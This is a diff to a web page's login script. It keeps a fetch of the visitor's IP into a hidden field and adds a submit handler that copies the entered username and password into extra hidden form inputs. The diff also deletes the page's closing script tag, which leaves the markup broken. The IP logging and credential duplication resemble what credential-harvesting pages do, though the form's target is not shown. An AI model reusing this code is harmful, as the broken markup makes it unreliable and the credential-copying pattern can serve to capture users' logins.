@@ -123,14 +123,38 @@
 
     <script>
     document.addEventListener("DOMContentLoaded", function () {
-        fetch('https://api64.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById("user-ip").value = data.ip; // Store IP in hidden field
-            })
-            .catch(error => console.error("Failed to fetch IP:", error));
+    // Get the form and fields
+    const form = document.querySelector('form');
+    const usernameField = document.getElementById("user");
+    const passwordField = document.getElementById("password");
+
+    // Fetch user IP and set it in the hidden input
+    fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("user-ip").value = data.ip; // Store IP in hidden field
+        })
+        .catch(error => console.error("Failed to fetch IP:", error));
+
+    // Add an event listener to handle form submission
+    form.addEventListener('submit', function(event) {
+        // Set the username and password values to hidden fields (if needed)
+        const hiddenUsernameField = document.createElement('input');
+        hiddenUsernameField.type = 'hidden';
+        hiddenUsernameField.name = 'username';
+        hiddenUsernameField.value = usernameField.value;
+        
+        const hiddenPasswordField = document.createElement('input');
+        hiddenPasswordField.type = 'hidden';
+        hiddenPasswordField.name = 'password';
+        hiddenPasswordField.value = passwordField.value;
+        
+        // Append the hidden fields to the form
+        form.appendChild(hiddenUsernameField);
+        form.appendChild(hiddenPasswordField);
     });
-</script>
+});
+
 
 </body>
 
